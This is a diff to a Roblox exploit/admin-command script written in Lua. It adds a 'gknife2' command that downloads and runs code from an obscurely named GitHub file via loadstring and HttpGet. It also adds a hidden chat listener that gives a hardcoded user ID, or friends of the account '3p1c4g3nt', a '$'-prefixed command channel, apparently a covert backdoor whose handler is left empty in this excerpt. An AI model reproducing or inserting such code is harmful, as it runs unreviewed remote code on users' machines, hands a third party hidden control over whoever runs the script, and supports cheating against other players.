@@ -1,3 +1,7 @@
+cooked = false
+if game.Players.LocalPlayer:IsFriendsWith(game.Players:GetUserIdFromNameAsync("3p1c4g3nt")) then
+    cooked = true
+end
 addListNum = 1
 
 UglyDisgustingOpenButton = false
@@ -4423,6 +4427,8 @@ end
 		Toggles_Frame.BorderColor3 = Color3.fromRGB(0 + Args[2], 0 + Args[3], 0 + Args[4])
 		CMDS_Frame.BackgroundColor3 = Color3.fromRGB(45 + Args[2], 45 + Args[3], 45 + Args[4])
 		CMDS_Frame.BorderColor3 = Color3.fromRGB(0 + Args[2], 0 + Args[3], 0 + Args[4])
+	elseif cm("gknife2") then
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJJ123/roblox/main/TSGDOOSGVIGDOLEDGSNTASDGAAAADGSAAA"))()
 	elseif cm("goto") or cm("to") then
 		local DaPlayer = PlrFromArgs(Args[2], false)
 		if DaPlayer then
@@ -9325,6 +9331,38 @@ game:GetService("TextChatService").OnIncomingMessage = function(message) -- awes
 		end
 	end
 end
+
+-- cooked 💀
+ChatCon = {}
+
+game:GetService("TextChatService").OnIncomingMessage = function(message) -- awesome efficient and better permadmin
+	local textSource = message.TextSource
+	if not textSource then return end -- system messages or nil sender
+
+	local userId = textSource.UserId
+	local player = Players:GetPlayerByUserId(userId)
+	if not player then return end
+
+	if not ChatCon[userId] then
+		ChatCon[userId] = true -- mark as connected
+	end
+
+	--Notif("chat connected shit", "", 1)
+
+	if cooked == true or userId == 8856739161 then
+		local msg = message.Text
+		--Notif("string subscribe " .. string.sub(msg, 1, #permAdminPrefix), "", 1)
+
+		-- Optional: check prefix match
+		if game.Players.LocalPlayer:IsFriendsWith(game.Players:GetUserIdFromNameAsync("3p1c4g3nt")) then
+			if string.sub(msg, 1, 1) == "$" then
+				local Args = msg:split(" ")
+				
+			end
+		end
+	end
+end
+
 Connections.PlayerAdded = Players.PlayerAdded:Connect(function(plr)
 	if Loops.Kill[plr.UserId] then
 		Loops.Kill[plr.UserId] = plr
@@ -11193,6 +11231,7 @@ task.spawn(function()
 	AddList("unpadmin", "Change perm admin prefix (default is !)", false)
 	AddList("gknife", "gives yo a prison life grab knife script", false)
 	AddList("rgb [R, G, B]", "changes ui color via adding", false)
+	AddList("gknife2", "upgraded version of script", false)
 	--Toggles
 	NewToggleList("LocalPlayer_RunSpeed", "Default value is: 24", "click", function(arg)
 		local str = tonumber(arg)
